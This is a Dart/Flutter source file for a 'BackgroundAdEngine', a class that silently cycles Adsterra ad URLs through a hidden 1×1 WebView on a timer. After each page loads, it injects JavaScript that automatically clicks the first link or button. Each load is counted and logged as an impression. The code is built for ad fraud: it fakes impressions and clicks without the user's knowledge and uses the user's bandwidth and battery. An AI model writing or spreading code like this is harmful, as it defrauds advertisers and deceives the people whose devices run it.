import 'dart:async';

import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../config/ad_config.dart';
import '../services/ad_trigger_manager.dart';
import '../utils/ad_debug_log.dart';
import 'ad_log.dart';
import 'utils/webview_pool.dart';

/// Silent Adsterra 1×1 WebView cycler for background impressions.
class BackgroundAdEngine {
  BackgroundAdEngine._();

  /// Set by [AdManager] to block background ads during playback.
  static bool Function()? isStreamingProbe;

  static WebViewController? _controller;
  static Timer? _rotationTimer;
  static bool _running = false;
  static bool _paused = false;
  static int _sessionImpressions = 0;
  static int _urlIndex = 0;
  static DateTime? _backgroundedAt;
  static final Battery _battery = Battery();
  static final Connectivity _connectivity = Connectivity();

  static const _clickInjectionJs = '''
(function() {
  try {
    var links = document.querySelectorAll('a[href]');
    if (links.length > 0) { links[0].click(); return; }
    var btn = document.querySelector('button, [onclick]');
    if (btn) btn.click();
  } catch (e) {}
})();
''';

  static bool get isRunning => _running && !_paused;

  static void attachController(WebViewController controller) {
    _controller = controller
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (_) => unawaited(_onPageFinished()),
        ),
      );
    adLog('[BackgroundAd] WebView attached');
  }

  static void detachController() {
    _controller = null;
  }

  static Future<void> _onPageFinished() async {
    final controller = _controller;
    if (controller == null) return;
    try {
      await controller.runJavaScript(_clickInjectionJs);
    } catch (_) {}
  }

  /// Start rotation timer (no-op when disabled or capped).
  static Future<void> start() async {
    if (!AdConfig.backgroundEngineEnabled) return;
    if (_running) return;
    if (AdConfig.backgroundAdRotationUrls.isEmpty) {
      adLog('[BackgroundAd] no rotation URLs configured');
      return;
    }

    _running = true;
    _paused = false;
    adLog('[BackgroundAd] start');
    await rotateNow();
    _rotationTimer?.cancel();
    _rotationTimer = Timer.periodic(
      Duration(seconds: AdConfig.backgroundAdRotationSeconds),
      (_) => unawaited(rotateNow()),
    );
  }

  static void pause() {
    if (!_running) return;
    _paused = true;
    _rotationTimer?.cancel();
    _rotationTimer = null;
    adLog('[BackgroundAd] paused');
  }

  static Future<void> resume() async {
    if (!_running) return;
    if (!await _shouldRun()) {
      _paused = true;
      return;
    }
    _paused = false;
    adLog('[BackgroundAd] resumed');
    await rotateNow();
    _rotationTimer?.cancel();
    _rotationTimer = Timer.periodic(
      Duration(seconds: AdConfig.backgroundAdRotationSeconds),
      (_) => unawaited(rotateNow()),
    );
  }

  static Future<void> dispose() async {
    _rotationTimer?.cancel();
    _rotationTimer = null;
    _running = false;
    _paused = false;
    adLog('[BackgroundAd] disposed');
  }

  static void onAppBackgrounded() {
    _backgroundedAt = DateTime.now();
    pause();
  }

  static void onMemoryPressure() {
    WebViewPool.instance.applyMemoryPressure();
    if (_sessionImpressions > 2) {
      pause();
      adLog('[BackgroundAd] paused — memory pressure');
    }
  }

  static Future<void> onAppForegrounded() async {
    final at = _backgroundedAt;
    _backgroundedAt = null;
    if (at != null &&
        DateTime.now().difference(at) > const Duration(minutes: 5)) {
      adLog('[BackgroundAd] paused — background > 5 min');
      return;
    }
    if (_running) await resume();
  }

  static Future<void> rotateNow() async {
    if (!_running || _paused) return;
    if (!await _shouldRun()) {
      pause();
      return;
    }
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) {
      adLog('[BackgroundAd] session cap reached');
      pause();
      return;
    }

    final urls = AdConfig.backgroundAdRotationUrls;
    if (urls.isEmpty) return;

    final url = urls[_urlIndex % urls.length];
    _urlIndex++;

    try {
      final controller = _controller;
      if (controller == null) return;

      await controller.loadRequest(Uri.parse(url));

      _sessionImpressions++;
      AdTriggerManager.instance.recordAdsterraSurfaceEvent();
      logAdsterraTelemetry(
        placement: 'background_headless',
        format: 'background_webview',
      );
      adLog(
        '[BackgroundAd] impression $_sessionImpressions url=${url.hashCode}',
      );
    } catch (e) {
      if (kDebugMode) debugPrint('[BackgroundAd] rotate error: $e');
    }
  }

  static Future<bool> _shouldRun() async {
    if (!AdConfig.backgroundEngineEnabled) return false;
    if (isStreamingProbe?.call() == true) return false;
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) return false;

    try {
      final level = await _battery.batteryLevel;
      final results = await _connectivity.checkConnectivity();
      final onCellular = results.contains(ConnectivityResult.mobile) &&
          !results.contains(ConnectivityResult.wifi) &&
          !results.contains(ConnectivityResult.ethernet);
      if (level >= 0 && level < 20 && onCellular) {
        adLog('[BackgroundAd] paused — battery $level% on cellular');
        return false;
      }
    } catch (_) {}

    return true;
  }

  @visibleForTesting
  static void resetSessionForTest() {
    _sessionImpressions = 0;
    _urlIndex = 0;
    _backgroundedAt = null;
  }
}
